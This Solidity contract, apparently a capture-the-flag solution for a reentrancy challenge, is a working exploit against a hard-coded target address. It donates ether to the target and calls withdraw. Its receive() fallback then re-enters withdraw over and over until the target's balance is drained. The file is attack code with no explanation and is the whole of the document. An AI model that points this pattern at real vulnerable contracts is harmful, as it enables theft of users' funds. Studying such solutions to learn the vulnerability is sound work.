// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IReentrancy {
    function donate(address) external payable;
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
}

contract solveReentrancy {

    address instance = 0x6442245E94ef21dE573F39191de609eD652dA1dd;
    IReentrancy target = IReentrancy(instance);

    receive() external payable {
        uint256 remaining = address(target).balance;
        if (remaining > 0) {
            uint256 toWithdraw = remaining < msg.value ? remaining : msg.value;
            target.withdraw(toWithdraw);
        }
    }

    function donateTo() external payable {
        target.donate{value: msg.value}(address(this));
    }

    function callWithdraw() external {
        target.withdraw(0.001 ether);
    }

}